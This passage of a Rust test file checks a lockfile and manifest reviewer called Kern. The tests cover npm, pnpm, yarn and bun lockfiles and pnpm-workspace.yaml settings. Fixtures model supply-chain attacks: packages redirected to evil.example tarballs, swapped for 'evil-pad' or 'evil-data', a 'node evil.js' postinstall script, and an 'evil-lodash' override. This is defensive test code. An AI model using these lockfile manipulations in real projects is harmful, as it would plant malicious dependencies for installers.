    assert!(r["unverified"][0]["what"].as_str().unwrap().starts_with("`ai-gateway/Cargo.lock`: Kern does not read this file"), "{}", r["unverified"]);
}

#[test]
fn stage1_review_r3_a_package_json_kern_cannot_read_is_not_verified_and_one_with_a_byte_order_mark_is_read() {
    let manifest = |extra: &str| format!(r#"{{"name":"app","scripts":{{"test":"vitest run","postinstall":"node tools/x.js"}},"devDependencies":{{"vitest":"3.2.0"}}{extra}}}"#);
    let big = manifest(&format!(r#","description":"{}""#, "a".repeat(1 << 20)));
    let r = receipt_of(&rules_for(&[("package.json", MANIFEST)], &[("package.json", &big)]));
    assert_eq!((r["decision"].as_str(), kinds(&r, "unverified")), (Some("unverified"), vec!["not-checked-install".to_string()]),
        "a package.json over the size Kern reads can add an install script Kern never sees: {r}");
    assert!(r["unverified"][0]["what"].as_str().unwrap().contains("larger than 1 MiB"), "{}", r["unverified"]);
    let marked = format!("\u{feff}{}", manifest(""));
    let r = receipt_of(&rules_for(&[("package.json", MANIFEST)], &[("package.json", &marked)]));
    assert_eq!((r["decision"].as_str(), kinds(&r, "look")), (Some("look"), vec!["install".to_string()]), "npm strips a byte order mark, so Kern reads the install script too: {r}");
}

#[test]
fn the_yaml_reader_refuses_what_pnpm_and_yarn_never_write_and_reads_what_they_do() {
    let ok = |text: &str| kern::lock::yaml(text, kern::lock::Schema::Failsafe).map(|docs| docs.len());
    for (what, text) in [
        ("an anchor", "a: &x 1\nb: *x\n"), ("a tag", "a: !!str 1\n"), ("a merge key", "a:\n  <<: {b: c}\n"), ("a key given twice", "a: 1\na: 2\n"),
        ("a tab", "a:\n\tb: 1\n"), ("a quoted value over two lines", "a: 'b\n  c'\n"), ("a nested flow map", "a: {b: {c: d}}\n"),
        ("a mapping inside a sequence", "a:\n  - b: c\n"), ("a broken indent", "a:\n    b: 1\n  c: 2\n"),
        ("a plain value holding a colon and space", "a: b: c\n"), ("a YAML escape JSON lacks", "a: \"\\x41\"\n"), ("an empty file", ""),
    ] { assert!(ok(text).is_err(), "{what}: {text:?}"); }
    assert_eq!(ok("---\nlockfileVersion: '9.0'\r\n# a comment\npackages:\n\n  'a@1.0.0':\n    resolution: {integrity: sha512-x, tarball: https://h/a/-/a-1.0.0.tgz}\n    cpu: [x64, arm64]\n    deprecated: |-\n      line one\n\n      line two\n---\nb: ''\n"), Ok(2));
}

#[test]
fn a_lockfile_cut_off_or_corrupted_anywhere_is_read_or_refused_and_never_crashes_kern() {
    let lago = lago_base();
    let npm = json!({ "lockfileVersion": 3, "packages": { "": { "name": "app", "dependencies": { "ms": "^2.1.3" } },
        "node_modules/ms": { "version": "2.1.3", "resolved": "https://registry.npmjs.org/ms/-/ms-2.1.3.tgz", "integrity": "sha512-6FlzubTLZG3J2a/NVCAleEhjzq5oxgHyaCU9yYXvcLsvoVaHJq/s5xXI6/XXP6tz7R9xAOtHnSO/tXtF3WRTlA==" } } }).to_string();
    for (name, text) in [("pnpm-lock.yaml", lago.as_str()), ("pnpm-lock.yaml", VUEJS_CORE_HEAD), ("yarn.lock", BOX_BASE), ("yarn.lock", TLDRAW_BASE), ("bun.lock", BUN2NIX_GIT_DEPS), ("package-lock.json", npm.as_str())] {
        let whole = read(name, text).unwrap();
        for cut in (0..text.len()).filter(|i| text.is_char_boundary(*i)) {
            if let Ok(part) = read(name, &text[..cut]) { assert!(part.installs.len() <= whole.installs.len(), "{name} cut at {cut} reads more than the whole file"); }
        }
        for at in (0..text.len()).filter(|i| text.is_char_boundary(*i) && text.is_char_boundary(*i + 1)) {
            for odd in [":", "{", "\"", "'", "#", " ", "\n", "\t", "\\", ",", "é"] {
                let _ = read(name, &format!("{}{odd}{}", &text[..at], &text[at + 1..]));
            }
        }
    }
    for at in (0..COMFY_WORKSPACE.len()).filter(|i| COMFY_WORKSPACE.is_char_boundary(*i) && COMFY_WORKSPACE.is_char_boundary(*i + 1)) {
        let _ = kern::lock::workspace(&COMFY_WORKSPACE.as_bytes()[..at]);
        for odd in [":", "-", "\"", "'", "#", " ", "\n", "[", "é"] { let _ = kern::lock::workspace(format!("{}{odd}{}", &COMFY_WORKSPACE[..at], &COMFY_WORKSPACE[at + 1..]).as_bytes()); }
    }
}

#[test]
fn an_npm_lockfile_that_gains_a_root_alias_installs_no_other_package_and_an_npm_6_git_dependency_is_a_source() {
    let tarball = "https://registry.npmjs.org/string-width/-/string-width-4.2.3.tgz";
    let old = json!({ "lockfileVersion": 3, "packages": { "": { "name": "app" } } });
    let new = json!({ "lockfileVersion": 3, "packages": { "": { "name": "app", "dependencies": { "sw": "npm:string-width@^4.2.0" } },
        "node_modules/sw": { "name": "string-width", "version": "4.2.3", "resolved": tarball, "integrity": "sha512-s" } } });
    let npm = |v: &Value| read("package-lock.json", &v.to_string()).unwrap();
    assert!(kern::deps::lock_surprises(&npm(&old), &npm(&new)).is_empty(), "the project's own package.json declares the alias, so the root entry counts");
    let six = |version: &str| json!({ "lockfileVersion": 1, "dependencies": { "sw": { "version": version, "resolved": tarball },
        "tool": { "version": "git+https://github.com/acme/tool.git#0a2d2506c1fe299691fc5db53a2097db3bd615bc", "from": "git+https://github.com/acme/tool.git" } } });
    let found = kern::deps::lock_surprises(&npm(&json!({ "lockfileVersion": 1 })), &npm(&six("npm:string-width@4.2.3")));
    assert_eq!(found, ["tool downloads from git+https://github.com/acme/tool.git#0a2d2506c1fe299691fc5db53a2097db3bd615bc, which is not its own registry tarball"],
        "npm 6 records an alias and a git source in the version field: {found:?}");
}

#[test]
fn a_hoisted_package_that_moves_its_place_without_a_new_version_is_no_move() {
    let tarball = "https://registry.npmjs.org/ms/-/ms-2.1.3.tgz";
    let at = |key: &str| json!({ "lockfileVersion": 3, "packages": { "": { "name": "app" }, key: { "version": "2.1.3", "resolved": tarball, "integrity": "sha512-m" } } });
    let npm = |v: &Value| read("package-lock.json", &v.to_string()).unwrap();
    let (old, new) = (npm(&at("node_modules/debug/node_modules/ms")), npm(&at("node_modules/ms")));
    assert!(kern::deps::lock_moves(&old, &new).is_empty() && kern::deps::lock_surprises(&old, &new).is_empty(), "the same package at another place installs nothing new");
}

#[test]
fn review_probe_a_bun_lock_package_path_that_repeats_a_slash_after_a_scope_is_refused_and_never_crashes_kern() {
    for key in ["@é///csstype", "@é//", "///", "@", "@/", "a//csstype", "é/@é/x", "@s/", "/csstype", "csstype/"] {
        let text = BUN2NIX_GIT_DEPS.replace("\"csstype\": [\"csstype@3.2.3\"", &format!("{}: [\"csstype@3.2.3\"", json!(key)));
        let got = std::panic::catch_unwind(|| read("bun.lock", &text));
        assert!(matches!(got, Ok(Err(_))), "{key:?}: a package path that names no package is not in the form Bun writes, and reading it must not crash Kern: {got:?}");
    }
    let nested = BUN2NIX_GIT_DEPS.replace("\"csstype\": [\"csstype@3.2.3\"", "\"@types/node/csstype\": [\"csstype@3.2.3\"");
    assert_eq!(read("bun.lock", &nested).unwrap().installs["@types/node/csstype"].name, "csstype");
}

const LEFT_PAD: &str = "      left-pad:\n        specifier: 1.3.0\n        version: 1.3.0\n\npackages:";

#[test]
fn review_probe_a_pnpm_9_snapshot_that_carries_its_own_resolution_or_name_is_not_read_as_pnpm_writes_it() {
    let base = [("package.json", MANIFEST), ("pnpm-lock.yaml", LAGO_HEAD)];
    let own = LAGO_HEAD.replace("version: 1.5.0(@types/react@18.3.31)(react@18.3.1)\n\npackages:", "version: slot-kit@1.0.0\n\npackages:")
        .replace("  '@repeaterjs/repeater@3.0.6': {}\n", "  '@repeaterjs/repeater@3.0.6': {}\n\n  slot-kit@1.0.0:\n    resolution: {tarball: https://evil.example/slot-kit.tgz}\n");
    let integrity = "    resolution: {integrity: sha512-Javneu5lsuhwNCryN+pXH93VPQ8g0dBX7wItHFgYiwQmzE1sVdg5tWHiOgHywzL2W21XQopa7IwIEnNbmeUJYA==}\n";
    let named = LAGO_HEAD.replace("\n\npackages:", &format!("\n{LEFT_PAD}")).replace(&format!("  '@repeaterjs/repeater@3.0.6':\n{integrity}"),
        &format!("  '@repeaterjs/repeater@3.0.6':\n{integrity}\n  left-pad@1.3.0:\n    resolution: {{integrity: sha512-qx7oqnYbxnK9kYI9m317qmFmEgo6ywqWvbTogdj7cL9p3/yx4M48p7Rnw5z3H890cL/ow/EeWJsuTykeZVXP5Q==}}\n"))
        .replace("  '@repeaterjs/repeater@3.0.6': {}\n", "  '@repeaterjs/repeater@3.0.6': {}\n\n  left-pad@1.3.0:\n    name: evil-pad\n");
    for (what, head, entry) in [("a snapshot with its own tarball and no package entry", own.as_str(), "slot-kit@1.0.0"), ("a snapshot that names another package", named.as_str(), "left-pad@1.3.0")] {
        let why = read("pnpm-lock.yaml", head).unwrap_err();
        assert!(why.contains(entry), "{what}: pnpm installs a snapshot with its package entry laid over it, so a snapshot's own resolution or name decides what is downloaded: {why}");
        let r = receipt_of(&rules_for(&base, &[("pnpm-lock.yaml", head)]));
        assert_ne!(r["decision"], "clear", "{what}: {r}");
    }
}

#[test]
fn review_probe_a_new_pnpm_package_entry_that_names_another_package_than_its_key_is_a_swap() {
    let manifest = MANIFEST.replace("\"devDependencies\"", "\"dependencies\":{\"left-pad\":\"1.3.0\"},\"devDependencies\"");
    let integrity = "    resolution: {integrity: sha512-Javneu5lsuhwNCryN+pXH93VPQ8g0dBX7wItHFgYiwQmzE1sVdg5tWHiOgHywzL2W21XQopa7IwIEnNbmeUJYA==}\n";
    let head = LAGO_HEAD.replace("\n\npackages:", &format!("\n{LEFT_PAD}")).replace(&format!("  '@repeaterjs/repeater@3.0.6':\n{integrity}"),
        &format!("  '@repeaterjs/repeater@3.0.6':\n{integrity}\n  left-pad@1.3.0:\n    name: evil-pad\n    version: 1.3.0\n    resolution: {{integrity: sha512-qx7oqnYbxnK9kYI9m317qmFmEgo6ywqWvbTogdj7cL9p3/yx4M48p7Rnw5z3H890cL/ow/EeWJsuTykeZVXP5Q==}}\n"))
        .replace("  '@repeaterjs/repeater@3.0.6': {}\n", "  '@repeaterjs/repeater@3.0.6': {}\n\n  left-pad@1.3.0: {}\n");
    let rules = rules_for(&[("package.json", MANIFEST), ("pnpm-lock.yaml", LAGO_HEAD)], &[("package.json", &manifest), ("pnpm-lock.yaml", &head)]);
    assert!(whys(&rules).iter().any(|w| w == "left-pad@1.3.0 installs another package: evil-pad in place of left-pad"),
        "pnpm downloads the package an entry names, so every reference to left-pad@1.3.0 installs evil-pad: {}", rules["lockfile"]);
    assert_eq!(kinds(&receipt_of(&rules), "look"), ["lockfile"]);
}

#[test]
fn review_probe_a_yarn_berry_key_that_joins_descriptors_without_a_space_still_names_each_one() {
    let base = [("package.json", MANIFEST), ("yarn.lock", TLDRAW_BASE)];
    for joined in ["\"evil-data@npm:7.29.0,@babel/compat-data@npm:^7.28.6\"", "\"evil-data@npm:7.29.0  ,  @babel/compat-data@npm:^7.28.6\""] {
        let head = TLDRAW_BASE.replace("\"@babel/compat-data@npm:^7.28.6\":\n  version: 7.29.0\n  resolution: \"@babel/compat-data@npm:7.29.0\"",
            &format!("{joined}:\n  version: 7.29.0\n  resolution: \"evil-data@npm:7.29.0\""));
        let rules = rules_for(&base, &[("yarn.lock", &head)]);
        assert!(whys(&rules).iter().any(|w| w == "@babel/compat-data@npm:^7.28.6 installs another package: evil-data in place of @babel/compat-data"),
            "yarn splits a key on commas with any spaces around them: {joined}: {}", rules["lockfile"]);
    }
}

#[test]
fn review_probe_a_yarn_berry_archive_url_after_another_parameter_or_with_an_escaped_name_is_a_source() {
    let base = [("package.json", MANIFEST), ("yarn.lock", TLDRAW_BASE)];
    for params in ["foo=1&__archiveUrl=https%3A%2F%2Fevil.example%2Ftypescript-5.9.3.tgz", "__archive%55rl=https%3A%2F%2Fevil.example%2Ftypescript-5.9.3.tgz"] {
        let head = TLDRAW_BASE.replace("resolution: \"typescript@npm:5.9.3\"", &format!("resolution: \"typescript@npm:5.9.3::{params}\""));
        let rules = rules_for(&base, &[("yarn.lock", &head)]);
        assert!(whys(&rules).iter().any(|w| w == "typescript 5.9.3 downloads from https://evil.example/typescript-5.9.3.tgz, which is not its own registry tarball"),
            "yarn reads the part after :: as a query string, so {params} sets the archive URL: {}", rules["lockfile"]);
    }
}

#[test]
fn review_probe_a_yarn_lock_whose_version_comment_yarn_2_does_not_match_is_not_read_as_yarn_1() {
    assert!(read("yarn.lock", &BOX_BASE.replace("# yarn lockfile v1\n", "# yarn lockfile v1 \n")).is_err(),
        "yarn 2 and later read a lockfile as yarn 1's format only when `# yarn lockfile v1` ends its line, and as YAML otherwise");
    assert!(read("yarn.lock", &BOX_BASE.replace("# yarn lockfile v1\n", "# YARN LOCKFILE V1\n")).is_ok(), "the match ignores case");
}

#[test]
fn review_probe_a_package_installed_from_a_tarball_inside_the_change_is_a_source_in_npm_6_and_yarn_1_lockfiles_too() {
    let six = json!({ "lockfileVersion": 1, "dependencies": { "kit": { "version": "file:vendor/kit-1.0.0.tgz", "integrity": "sha512-k" }, "local": { "version": "file:packages/local" } } });
    let found = kern::deps::lock_surprises(&read("package-lock.json", "{\"lockfileVersion\": 1}").unwrap(), &read("package-lock.json", &six.to_string()).unwrap());
    assert_eq!(found, ["kit downloads from file:vendor/kit-1.0.0.tgz, which is not its own registry tarball"], "npm 6 records a tarball in the change only in version: {found:?}");
    let classic = format!("{BOX_BASE}\n\"kit@file:vendor/kit-1.0.0.tgz\":\n  version \"1.0.0\"\n\n\"local@file:packages/local\":\n  version \"1.0.0\"\n");
    let found = kern::deps::lock_surprises(&read("yarn.lock", BOX_BASE).unwrap(), &read("yarn.lock", &classic).unwrap());
    assert_eq!(found, ["kit 1.0.0 downloads from file:vendor/kit-1.0.0.tgz, which is not its own registry tarball"], "a folder is the change's own code, a tarball hides code Kern does not read: {found:?}");
}

const COMFY_WORKSPACE: &str = "packages:
  - apps/**
  - packages/**
  - tools/**

nodeOptions: '${NODE_OPTIONS:- } --no-experimental-webstorage --max-old-space-size=8192'

ignoreWorkspaceRootCheck: true
catalogMode: prefer
publicHoistPattern:
  - '@parcel/watcher'

catalog:
  '@alloc/quick-lru': ^5.2.0
  '@vitejs/plugin-vue': ^6.0.8
  vite: ^8.2.2
  vue: ^3.5.40
  vue-component-type-helpers: ^3.3.9
  vue-tsc: ^3.3.9

cleanupUnusedCatalogs: true

allowBuilds:
  '@comfyorg/comfy-multi-player@https://codeload.github.com/Comfy-Org/comfy-multi-player/tar.gz/58e2333ce3bb6375fd2efbc1e9d7df17327f37e0': true
  '@firebase/util': false
  esbuild: true

overrides:
  vite: 'catalog:'
  '@tiptap/pm': 3.31.0
  # Security overrides
  lodash: ^4.18.0
  minimatch@^9.0.0: ^9.0.7

# Transitional - drop once 0.2.0 is older than the release-age gate.
minimumReleaseAgeExclude:
  - '@comfyorg/comfyui-desktop-bridge-types@0.2.0'
  - '@comfyorg/comfy-multi-player@0.2.0 || 0.2.1'
";
fn workspace_note(base: &str, head: &str) -> (Value, Value) {
    let rules = rules_for(&[("package.json", MANIFEST), ("pnpm-workspace.yaml", base)], &[("pnpm-workspace.yaml", head)]);
    let r = receipt_of(&rules);
    (rules, r)
}

#[test]
fn comfy_org_comfyui_frontend_17136_a_catalog_bump_in_pnpm_workspace_yaml_is_read_and_named_in_the_note() {
    let head = COMFY_WORKSPACE.replace("vue: ^3.5.40", "vue: ^3.5.42").replace("vue-component-type-helpers: ^3.3.9", "vue-component-type-helpers: ^3.3.11").replace("vue-tsc: ^3.3.9", "vue-tsc: ^3.3.11");
    let (rules, r) = workspace_note(COMFY_WORKSPACE, &head);
    assert_eq!((unread(&rules), r["decision"].as_str(), kinds(&r, "look")), (vec![], Some("clear"), vec![]), "{r}");
    assert!(note(&r).contains("vue ^3.5.40 → ^3.5.42") && note(&r).contains("vue-tsc ^3.3.9 → ^3.3.11"), "catalog versions are the dependencies note: {}", note(&r));
    let commented = COMFY_WORKSPACE.replace("  # Security overrides\n", "  # Security overrides, reviewed\n");
    assert_eq!(rules_for(&[("pnpm-workspace.yaml", COMFY_WORKSPACE)], &[("pnpm-workspace.yaml", &commented)])["dependencies"], json!([]), "a comment moves nothing");
}

#[test]
fn constructive_io_blocks_35_removing_an_override_from_pnpm_workspace_yaml_is_an_install_look_naming_it() {
    let base = "packages:
  - packages/*

# The only dependencies permitted to run install scripts.
allowBuilds:
  \"@tailwindcss/oxide\": true # native binary, downloaded at install time
  esbuild: true # native binary, fetched by its install script
  msw: true # generates the mock service worker script used by tests

# Transitive dependencies must come from the registry, not from git or a URL.
blockExoticSubdeps: true

# @fbp/evaluator@1.3.0 was published with `\"@fbp/types\": \"workspace:*\"` in its
# dependencies — a spec no registry consumer can resolve, so installing it fails
# outright. Pin the real range until the @fbp packages are republished with
# resolved dependency ranges, then delete this block.
overrides:
  \"@fbp/evaluator>@fbp/types\": \"^1.4.0\"
";
    let head = &base[..base.find("\n# @fbp").unwrap() + 1];
    let (rules, r) = workspace_note(base, head);
    assert_eq!(unread(&rules), Vec::<String>::new(), "a comment after a value is YAML that pnpm reads: {rules}");
    assert_eq!(kinds(&r, "look"), ["install"], "{r}");
    assert!(r["look"][0]["what"].as_str().unwrap().ends_with("changes what runs or what gets installed when dependencies install: `overrides`"), "{}", r["look"]);
}

#[test]
fn harperfast_create_harper_123_a_new_pnpm_workspace_yaml_that_lets_build_scripts_run_is_an_install_look() {
    let added = "# Pre-approve the build scripts for Next.js's native dependencies so `pnpm install` doesn't halt
# on them (pnpm 10.12+/11 gate dependency build scripts by default). npm and yarn ignore this file.
allowBuilds:
  sharp: true
  unrs-resolver: true
";
    let r = receipt_of(&rules_for(&[("package.json", MANIFEST)], &[("template-nextjs/pnpm-workspace.yaml", added)]));
    assert_eq!(kinds(&r, "look"), ["install"], "{r}");
    assert!(r["look"][0]["what"].as_str().unwrap().contains("`allowBuilds`"), "{}", r["look"]);
}

#[test]
fn mermaid_js_mermaid_8411_a_new_release_age_exclusion_is_an_install_look_and_the_comment_after_a_value_is_read() {
    let base = "minimumReleaseAge: 4320 # 4320 minutes = 3 days
packages:
  - 'packages/*'
  - 'tests/*'
minimumReleaseAgeExclude:
  # Renovate security update: dompurify@3.3.2 || 3.4.0 || 3.4.12
  - dompurify@3.3.2 || 3.4.0 || 3.4.12
  # Renovate security update: vitest@3.2.6
  - vitest@3.2.6
";
    let head = format!("{base}  # Renovate security update: katex@0.18.2\n  - katex@0.18.2\n");
    let (rules, r) = workspace_note(base, &head);
    assert_eq!(unread(&rules), Vec::<String>::new(), "{rules}");
    assert_eq!(kinds(&r, "look"), ["install"], "a package let past the release-age gate decides what gets installed: {r}");
    assert!(r["look"][0]["what"].as_str().unwrap().ends_with("`minimumReleaseAgeExclude`"), "{}", r["look"]);
}

#[test]
fn edwinjj1_roundtable_13_new_workspace_packages_are_a_named_note() {
    let base = "allowBuilds:\n  esbuild: set this to true or false\n  sharp: set this to true or false\n";
    let (rules, r) = workspace_note(base, &format!("packages:\n  - .\n\n{base}"));
    assert_eq!((unread(&rules), r["decision"].as_str(), kinds(&r, "look")), (vec![], Some("clear"), vec![]), "{r}");
    assert!(note(&r).contains("workspace . (new)"), "{}", note(&r));
}

#[test]
fn stage1_review_r3_a_pnpm_workspace_yaml_that_allows_every_build_or_overrides_a_package_needs_a_look() {
    let base = "packages:\n  - 'packages/*'\n";
    let head = format!("{base}dangerouslyAllowAllBuilds: true\noverrides:\n  lodash: npm:evil-lodash@4.17.21\n");
    let (_, r) = workspace_note(base, &head);
    assert_eq!((r["decision"].as_str(), kinds(&r, "look")), (Some("look"), vec!["install".to_string()]), "{r}");
    assert!(r["look"][0]["what"].as_str().unwrap().ends_with("`dangerouslyAllowAllBuilds`, `overrides`"), "{}", r["look"]);
}

#[test]
fn stage1_review_r3_a_pnpm_workspace_yaml_kern_cannot_read_is_not_verified() {
    let base = "packages:\n  - 'packages/*'\n";
    let head = "packages: [\n  'packages/*',\n]\nonlyBuiltDependencies: &all ['esbuild']\n";
    let (rules, r) = workspace_note(base, head);
    assert_eq!(unread(&rules), ["pnpm-workspace.yaml"], "{rules}");
    assert_eq!((r["decision"].as_str(), kinds(&r, "unverified")), (Some("unverified"), vec!["not-checked-install".to_string()]), "{r}");
    assert!(r["unverified"][0]["what"].as_str().unwrap().contains("Kern could not read this pnpm-workspace.yaml (line 1 is not in a form Kern reads)"), "{}", r["unverified"]);
}

#[test]
fn the_yaml_reader_reads_a_comment_after_a_value_and_a_sequence_at_its_keys_depth_as_yaml_does() {
    let one = |text: &str| kern::lock::yaml(text, kern::lock::Schema::Failsafe).map(|docs| docs.into_iter().next().unwrap());
    for (text, want) in [
        ("a: b # c\n", json!({ "a": "b" })),
        ("a: 'b # c' # d\n", json!({ "a": "b # c" })),
        ("a: \"b\\\" # c\" # d\n", json!({ "a": "b\" # c" })),
        ("a: it's # c\n", json!({ "a": "it's" })),
        ("a: b#c\n", json!({ "a": "b#c" })),
        ("a: [b, 'c # d'] # e\n", json!({ "a": ["b", "c # d"] })),
        ("a: # c\n  b: 1\n", json!({ "a": { "b": "1" } })),
        ("a: | # c\n  b # d\n", json!({ "a": "b # d\n" })),
        ("a:\n- b\n- 'c' # d\ne: 1\n", json!({ "a": ["b", "c"], "e": "1" })),
        ("a:\n  b:\n  - c\n  d: e\n", json!({ "a": { "b": ["c"], "d": "e" } })),
    ] { assert_eq!(one(text), Ok(want), "{text:?}"); }
    for text in ["a: 'b'#c\n", "a:\n- b\n  - c\n", "a:\n  - b\n  c: d\n"] { assert!(one(text).is_err(), "{text:?}"); }
}

#[test]
fn lock_review_1_a_pnpm_workspace_yaml_setting_quoted_from_false_to_the_string_false_is_an_install_look() {
    for (was, now) in [
        ("dangerouslyAllowAllBuilds: false", "dangerouslyAllowAllBuilds: 'false'"), ("dangerouslyAllowAllBuilds: false", "dangerouslyAllowAllBuilds: \"false\""),
        ("ignoreScripts: true", "ignoreScripts: 'true'"), ("strictDepBuilds: null", "strictDepBuilds: 'null'"), ("minimumReleaseAge: 4320", "minimumReleaseAge: '4320'"),
        ("onlyBuiltDependencies: [esbuild]", "onlyBuiltDependencies: [esbuild, 'true']"),
    ] {
        let (base, head) = (format!("packages:\n  - apps/*\n{was}\n"), format!("packages:\n  - apps/*\n{now}\n"));
        let (_, r) = workspace_note(&base, &head);
        let key = was.split(':').next().unwrap();
        assert_eq!((r["decision"].as_str(), kinds(&r, "look")), (Some("look"), vec!["install".to_string()]), "{was} → {now}: a setting pnpm reads as another type is a changed setting: {r}");
        assert!(r["look"][0]["what"].as_str().unwrap().ends_with(&format!("`{key}`")), "{}", r["look"]);
    }
    let (rules, _) = workspace_note("packages:\n  - apps/*\nignoreScripts: true\nminimumReleaseAge: 4320\n", "packages:\n  - 'apps/*'\nignoreScripts: True\nminimumReleaseAge: 4320.0\n");
    assert_eq!(rules["dependencies"], json!([]), "the same values written another way change nothing");
}

#[test]
fn lock_review_2_a_yarn_1_entry_without_resolved_from_git_github_or_a_url_is_not_read_as_a_registry_package() {
    for range in ["github:evil/kit", "evil/kit#main", "https://evil.example/kit-1.0.0.tgz", "git+https://github.com/evil/kit.git", "^1.0.0"] {
        let head = format!("{BOX_BASE}\n\"kit@{range}\":\n  version \"1.0.0\"\n");
        assert!(read("yarn.lock", &head).unwrap_err().contains("is not in the form yarn writes"), "yarn 1 writes resolved for every package it downloads: {range}");
        let rules = rules_for(&[("package.json", MANIFEST), ("yarn.lock", BOX_BASE)], &[("yarn.lock", &head)]);
        let r = receipt_of(&rules);
        assert_eq!((r["decision"].as_str(), kinds(&r, "unverified")), (Some("unverified"), vec!["not-checked-install".to_string()]), "{range}: leaving out a field never turns a look into a pass: {r}");
    }
    let local = format!("{BOX_BASE}\n\"local@file:packages/local\":\n  version \"1.0.0\"\n\n\"linked@link:../linked\":\n  version \"0.0.0\"\n\n\"portal@portal:../portal\":\n  version \"0.0.0\"\n");
    assert_eq!(read("yarn.lock", &local).unwrap(), read("yarn.lock", BOX_BASE).unwrap(), "a folder of the change's own code has no resolved and installs no package");
}

const OTHER_ECOSYSTEMS: [&str; 22] = ["pyproject.toml", "requirements.txt", "requirements-dev.txt", "setup.py", "setup.cfg", "Pipfile", "Pipfile.lock", "poetry.lock", "uv.lock",
    "Cargo.toml", "Cargo.lock", "go.mod", "go.sum", "go.work", "Gemfile", "Gemfile.lock", "deno.json", "deno.lock", "composer.json", "composer.lock", "pom.xml", "Podfile.lock"];

#[test]
fn lock_review_3_ag_ui_1149_and_rive_nitro_react_native_1_every_other_ecosystems_manifest_and_lockfile_is_not_verified() {
    for f in OTHER_ECOSYSTEMS.into_iter().chain(kern::rules::OTHER_DEPENDENCY_FILES).chain(["app.gemspec", "App.csproj", "requirements/base.txt"]) {
        let p = format!("example/{f}");
        let r = receipt_of(&rules_for(&[("package.json", MANIFEST), (&p, "a = 1\n")], &[(&p, "a = 2\n")]));
        assert_eq!((r["decision"].as_str(), kinds(&r, "unverified")), (Some("unverified"), vec!["not-checked-install".to_string()]), "{p}: {r}");
        assert!(r["unverified"][0]["what"].as_str().unwrap().starts_with(&format!("`{p}`: Kern does not read this file")), "{}", r["unverified"]);
    }
    let r = receipt_of(&rules_for(&[("package.json", MANIFEST), ("example/Gemfile.lock", "a\n"), ("example/Gemfile", "a\n")], &[("example/Gemfile.lock", "b\n"), ("example/Gemfile", "b\n")]));
    assert_eq!(kinds(&r, "unverified"), ["not-checked-install", "not-checked-install"], "rive-app/rive-nitro-react-native#1 changes both: {r}");
}

#[test]
fn lock_review_4_renovate_style_fixture_lockfiles_and_manifests_are_test_data_and_a_declared_workspace_package_still_counts() {
    let y = |url: &str| format!("# yarn lockfile v1\n\n\nfoo@^1.0.0:\n  version \"1.0.0\"\n  resolved \"{url}\"\n");
    let (good, moved) = (y("https://registry.yarnpkg.com/foo/-/foo-1.0.0.tgz"), y("https://npm.corp.example/foo/-/foo-1.0.0.tgz"));
    let v5 = |v: &str| format!("lockfileVersion: 5.4\n\nspecifiers:\n  foo: ^{v}\n");
    for (what, path, base, head) in [
        ("a fixture yarn.lock on a private registry", "lib/modules/manager/npm/__fixtures__/private/yarn.lock", good, moved),
        ("a pnpm 5 fixture lockfile", "test/fixtures/v5/pnpm-lock.yaml", v5("1.0.0"), v5("1.0.1")),
        ("a broken fixture package.json", "test/fixtures/bad/package.json", "{ not json".to_string(), "{ still not json".to_string()),
        ("a fixture Gemfile.lock", "spec/fixtures/bundler/Gemfile.lock", "a\n".to_string(), "b\n".to_string()),
        ("a testdata go.sum", "internal/testdata/go.sum", "a\n".to_string(), "b\n".to_string()),
    ] {
        let rules = rules_for(&[("package.json", MANIFEST), (path, &base)], &[(path, &head)]);
        let r = receipt_of(&rules);
        assert_eq!((r["decision"].as_str(), kinds(&r, "look"), kinds(&r, "unverified")), (Some("clear"), vec![], vec![]), "{what} is test data, not what gets installed: {r}");
    }
    let root = r#"{"name":"app","private":true,"workspaces":["fixtures/*"],"scripts":{"test":"vitest run"},"devDependencies":{"vitest":"3.2.0"}}"#;
    let script = |s: &str| format!(r#"{{"name":"fx","scripts":{{"postinstall":"{s}"}}}}"#);
    let r = receipt_of(&rules_for(&[("package.json", root), ("fixtures/app/package.json", &script("echo"))], &[("fixtures/app/package.json", &script("node evil.js"))]));
    assert_eq!(kinds(&r, "look"), ["install"], "a workspace package the root declares is installed, wherever it sits: {r}");
    let space = "packages:\n  - 'test/fixtures/*'\n";
    let r = receipt_of(&rules_for(&[("package.json", MANIFEST), ("pnpm-workspace.yaml", space), ("test/fixtures/app/package.json", &script("echo"))], &[("test/fixtures/app/package.json", &script("node evil.js"))]));
    assert_eq!(kinds(&r, "look"), ["install"], "pnpm-workspace.yaml's packages count as declarations too: {r}");
    let r = receipt_of(&rules_for(&[("package.json", MANIFEST), ("test/e2e/package.json", &script("echo"))], &[("test/e2e/package.json", &script("node evil.js"))]));
    assert_eq!(kinds(&r, "look"), ["install"], "a test project's own package.json is installed by its CI and is no fixture: {r}");
}

#[test]
fn lock_review_9_odd_case_lockfile_names_no_tool_reads_are_not_install_steering() {
    let rules = rules_for(&[("package.json", MANIFEST)], &[("Yarn.lock", "x\n"), ("PNPM-LOCK.YAML", "x\n"), ("CARGO.LOCK", "x\n")]);
    let r = receipt_of(&rules);
    assert_eq!((r["decision"].as_str(), kinds(&r, "unverified"), rules["dependencies"].clone()), (Some("clear"), vec![], json!([])), "Linux package managers read exact names: {r}");
}

#[test]
fn lock_review_6_a_check_reads_at_most_a_fixed_total_of_lockfile_bytes_and_any_past_it_is_not_verified() {
    let big = |name: &str| format!("{{\"name\": \"{name}\", \"lockfileVersion\": 3, \"packages\": {{}}}}{}", " ".repeat(48 << 20));
    let small = |name: &str| format!("{{\"name\": \"{name}\", \"lockfileVersion\": 3, \"packages\": {{}}}}\n");
    let rules = rules_for(&[("package.json", MANIFEST), ("a/package-lock.json", &small("a")), ("b/package-lock.json", &small("b")), ("c/package-lock.json", &small("c"))],
        &[("a/package-lock.json", &big("a")), ("b/package-lock.json", &big("b")), ("c/package-lock.json", &big("c"))]);
    assert_eq!(unread(&rules), ["c/package-lock.json"], "two 48 MiB lockfiles fit, the third does not: {}", rules["not_checked"]);
    let r = receipt_of(&rules);
    assert_eq!((r["decision"].as_str(), kinds(&r, "unverified")), (Some("unverified"), vec!["not-checked-install".to_string()]), "{r}");
    assert!(r["unverified"][0]["what"].as_str().unwrap().contains("MiB of lockfiles Kern reads in one check"), "{}", r["unverified"]);
}
#[test]
fn lock_review_1_the_yaml_reader_types_plain_scalars_as_pnpm_does_and_reads_yarn_berry_as_text() {
    use kern::lock::{Schema, yaml};
    let one = |text: &str, schema| yaml(text, schema).map(|docs| docs.into_iter().next().unwrap());
